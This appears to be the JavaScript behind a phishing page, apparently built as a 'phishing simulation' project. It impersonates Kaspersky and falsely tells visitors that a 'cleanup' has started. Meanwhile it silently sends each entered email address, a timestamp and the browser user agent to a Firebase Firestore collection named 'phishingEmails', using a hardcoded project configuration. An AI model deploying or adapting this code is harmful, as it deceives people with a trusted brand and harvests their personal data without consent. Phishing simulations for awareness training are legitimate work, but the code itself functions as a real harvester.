// Importa Firebase SDKs
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

// ✅ Tu configuración real
const firebaseConfig = {
  apiKey: "AIzaSyBKFqUh9kCTQT42SGp6RxcvFumL5z6vXZ0",
  authDomain: "simulacionphishing-a71ef.firebaseapp.com",
  projectId: "simulacionphishing-a71ef",
  storageBucket: "simulacionphishing-a71ef.firebasestorage.app",
  messagingSenderId: "408328008092",
  appId: "1:408328008092:web:7e8981137b5cab68f39859"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Función al hacer clic en el botón
window.enviar = async function () {
  const email = document.getElementById("email").value;
  const msg = document.getElementById("msg");

  if (!email.includes("@") || email.length < 6) {
    msg.innerText = "❌ Por favor, ingresa un correo válido.";
    return;
  }

  try {
    await addDoc(collection(db, "phishingEmails"), {
      email,
      fecha: new Date().toISOString(),
      userAgent: navigator.userAgent
    });
    msg.innerText = "✔️ Limpieza iniciada. Gracias por confiar en Kaspersky.";
    document.getElementById("email").value = "";
  } catch (e) {
    msg.innerText = "❌ Error al registrar el correo.";
    console.error("Error al guardar en Firestore:", e);
  }
};